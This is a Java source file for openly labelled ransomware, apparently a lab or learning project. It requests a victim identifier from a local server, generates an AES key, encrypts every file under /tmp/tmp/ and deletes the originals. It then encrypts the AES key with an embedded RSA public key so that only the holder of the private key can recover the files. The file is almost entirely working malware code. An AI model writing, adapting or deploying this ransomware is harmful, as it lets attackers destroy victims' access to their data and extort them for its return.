import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.AlgorithmParameters;
import java.security.KeyFactory;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.spec.KeySpec;
import java.security.spec.X509EncodedKeySpec;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.Random;
import java.util.stream.Stream;
import javax.crypto.Cipher;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;
import javax.crypto.SecretKey;

class secrets {
	private static Cipher cipher;

	void setKey(String myKey) throws Exception{
		byte[] salt = new byte[8];
		SecureRandom secureRandom = new SecureRandom();
		secureRandom.nextBytes(salt);
		FileOutputStream saltOutFile = new FileOutputStream("/tmp/tmp/salt.enc");
		saltOutFile.write(salt);
		saltOutFile.close();
		SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
		KeySpec keySpec = new PBEKeySpec(myKey.toCharArray(),salt,65536,256);
		SecretKey secretKey = factory.generateSecret(keySpec);
		SecretKeySpec secrets = new SecretKeySpec(secretKey.getEncoded(), "AES");

		cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
		cipher.init(Cipher.ENCRYPT_MODE, secrets);
		AlgorithmParameters params = cipher.getParameters();
                FileOutputStream ivOutFile = new FileOutputStream("/tmp/tmp/iv.enc");
                byte[] iV = params.getParameterSpec(IvParameterSpec.class).getIV();
                ivOutFile.write(iV);
                ivOutFile.close();
	}
	void encryptFiles(String inputFile, String outputFile) throws Exception{
		byte[] textString = new byte[64];
		FileOutputStream fileOutputStream = new FileOutputStream(outputFile);
		FileInputStream fileInputStream = new FileInputStream(inputFile);
		int count ;
		while((count = fileInputStream.read(textString)) != -1){
			byte[] output = cipher.update(textString,0,count);
			if(output != null)
				fileOutputStream.write(output);
		}
		byte[] output = cipher.doFinal();
		if(output != null){
			fileOutputStream.write(output);
		}
		fileInputStream.close();
		fileOutputStream.flush();
		fileOutputStream.close();
	}
    String initiaiteConnection() throws Exception{
        return sendPOST();
    }
	void encryptAESkey(String supersecretKey,String file_name) throws Exception{
		String publicKey = "-----BEGIN PUBLIC KEY-----MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAmPgtRSaWIL5XbY+B0oQVNfdUhPqs8/C1bXIzDGhvP6mw5h+Ma8Yzxt72mnGxb0WSkA1GlV7ku3pWK5gN1SnlzheuAqWdWo9UeJODPEKjE3V5eWv5QLQLNF5bw6xJVg/VTegS0IHzx5V3R53AfpGbRbaW2xdWnEQb1xM7C+dm/b5TwC0Ph295LViDlPeiZOF/ulpRExHYos4liFEohqsPdtI7/opo8KKi9p3ZrULMUqTvEn3MfCoyuWVTnR8QqOaLNV1lyuptQHpJUgxQn43p9EdTnEcXXdSaJ88+Wok9BIJB73bXd9/YHQIGXHC5RVj3nNEysyDBDx4ThuYaMm5BjCoFIPN8E4ce+tDWOp1FpMwct1oupMkwsEbp7zVKMLAECVlKSNICY2kR64U4g1/XtkPD8+/wd/No1buan5eTmUiOsao/7HoQSI3vuMGr2dNQl0daNp/0JNkLWSu8hrABDcIQD6YnkzGFiuTvB3JHv9HiinU9IUPgh+1jUuIUtDg0mlgH/wjkuTVCIPpEmfXdhb6yofhXM/Y5Jk6GNU3G4SX9M5NQ0rcKoMXNu2Je7BXMrL9E78JVViM8KBDJLvPdSVExTWzQP586SazRgI6VlK9MH0Yom0h89yTa5G8XjoFVPiSSXUkog/sl7g4Cs8LCL7VrE0xuiT+3TyCUlQESGFUCAwEAAQ==-----END PUBLIC KEY-----";
		String pubKey = publicKey.replaceAll("-","").replaceAll("BEGIN PUBLIC KEY","").replaceAll("END PUBLIC KEY","");
		byte[] publickBytes = Base64.getDecoder().decode(pubKey);
		X509EncodedKeySpec keySpec = new X509EncodedKeySpec(publickBytes);
		KeyFactory keyFactory = KeyFactory.getInstance("RSA");
		PublicKey public_Key = keyFactory.generatePublic(keySpec);
		Cipher cipher = Cipher.getInstance("RSA");
		cipher.init(Cipher.ENCRYPT_MODE,public_Key);
		byte[] cipherText = cipher.doFinal(supersecretKey.getBytes());
		FileOutputStream fileOutputStream;
		fileOutputStream = new FileOutputStream(file_name);
		fileOutputStream.write(cipherText);
		fileOutputStream.close();
	}

    String sendPOST() throws IOException{
		String req_url = "http://127.0.0.1/recv.php";
		URL obj = new URL(req_url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.addRequestProperty("Victim", "Yes");
		int maxTries = 3;
		while(maxTries != 0){
			int code = con.getResponseCode();
			if(code == 200){
				break;
			}
			maxTries--;
		}
		if(maxTries == 0){
			//code for self destruction
			System.out.println("Not Reachable!");
			System.exit(0);
		}
		BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
		String inputLine;
		StringBuilder response = new StringBuilder();
		while((inputLine = in.readLine()) != null){
			response.append(inputLine);
		}
		in.close();
		String identifier = response.toString();
		return identifier;
    }
}

class RansomwareActivate{
	private String supersecretKey = "";
	String chars = "qazwsxedcrfvtgbyhnujmikolpQAZWSXEDCRFVTGBYHNUJMIKOLP1234567890!@_-$";
	String generateKey(){
		Random r = new Random();
		int i;
		for(i=0;i<32;i++){
			supersecretKey=supersecretKey+chars.charAt(r.nextInt(chars.length()));
		}
		return supersecretKey;
	}

	String encryptAllFiles() throws Exception{
		supersecretKey = generateKey();
		secrets sec = new secrets();
		sec.setKey(supersecretKey);
		List<Path> fileNames = new ArrayList<>();
		Stream<Path> paths = Files.walk(Paths.get("/tmp/tmp/"));
		paths.filter(Files::isRegularFile).forEach(fileNames::add);
		Path salt_path = Paths.get("/tmp/tmp/salt.enc");
		Path iv_path = Paths.get("/tmp/tmp/iv.enc");
		fileNames.remove(salt_path);
		fileNames.remove(iv_path);
		for(Path file:fileNames){
			System.out.println("Encrypting file: "+file.toString());
			sec.encryptFiles(file.toString(),file.toString()+".enc");
			File f = new File(file.toString());
			f.delete();
		}
		return supersecretKey;
	}
}

class encrypt {
	private static String key_aes = "";
	public static String iden;
	static String activate() throws Exception{
		RansomwareActivate ransomware  = new RansomwareActivate();
		key_aes =  ransomware.encryptAllFiles();
		return key_aes;
	}
	public static String Identifier(){
		return iden;
	}
	public static void main(String[] args) throws Exception{
		secrets sec = new secrets();
		String res = sec.initiaiteConnection();
		if(res.equals("Not reachable!")){
			System.exit(0);
		}
		else {
			iden = res;
			System.out.println(iden);
			File f = new File("/tmp/tmp/id.enc");
			key_aes = activate();
			sec.encryptAESkey(key_aes,"/tmp/tmp/key.enc");
			sec.encryptAESkey(iden,"/tmp/tmp/id.enc");
			String[] tmp = {"tmp","qw"};
			launcher.main(tmp);
		}
	}
}